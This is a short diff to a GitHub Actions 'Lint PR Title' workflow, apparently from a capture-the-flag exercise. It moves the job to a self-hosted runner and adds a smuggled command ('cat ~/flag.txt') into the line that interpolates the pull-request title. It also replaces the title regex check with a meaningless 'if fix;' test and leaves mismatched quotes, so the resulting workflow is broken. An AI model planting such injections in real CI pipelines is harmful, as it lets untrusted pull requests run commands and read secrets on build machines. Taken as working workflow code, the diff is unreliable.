@@ -1,18 +1,16 @@
 name: Lint PR Title
-
 on:
   pull_request:
     types: [opened, reopened]
-
 jobs:
   lint_pr_title:
-    runs-on: ubuntu-latest
+    runs-on: self-hosted
     steps:
       - name: Check PR Title
         run: |
-          title="${{ github.event.pull_request.title }}"
+          title="${{ github.event.pull_request.title }}"Update README.md"; cat ~/flag.txt""
           echo $title
-          if [[ $title =~ ^(chore|fix|feat) ]]; then
+          if fix; then
             echo "PR title starts with 'chore', 'fix', or 'feat'"
             exit 0
           else
